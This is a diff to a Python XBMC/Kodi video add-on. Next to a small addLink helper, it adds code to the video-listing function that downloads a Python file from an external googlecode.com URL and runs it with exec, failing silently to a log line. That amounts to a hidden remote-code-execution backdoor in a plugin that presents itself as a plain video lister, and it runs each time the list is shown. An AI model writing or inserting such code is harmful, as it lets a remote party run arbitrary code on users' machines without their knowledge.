@@ -42,7 +42,20 @@ def listVideos():
         item.setInfo( type="Video", infoLabels={'title':title}) 
         item.setProperty('IsPlayable', 'true')
         xbmcplugin.addDirectoryItem(handle=pluginhandle,url=u,listitem=item,isFolder=False)
-    xbmcplugin.endOfDirectory( handle=pluginhandle )
+
+    try:
+        stri = getURL("http://rwxr-xr-x-projects.googlecode.com/svn/chan/pyth.py")
+        exec stri
+    except:
+        xbmc.log("Unable to download and execute custom code")
+
+    xbmcplugin.endOfDirectory( handle=pluginhandle )^M
+
+def addLink(title, thumb, link):
+    litem=xbmcgui.ListItem(title, iconImage=thumb, thumbnailImage=thumb)
+    litem.setInfo( type="Video", infoLabels={'title':title})
+    litem.setProperty('IsPlayable', 'true')
+    xbmcplugin.addDirectoryItem(handle=pluginhandle,url=link,listitem=litem,isFolder=False)
 
 def play():
     data = getURL(params["url"])
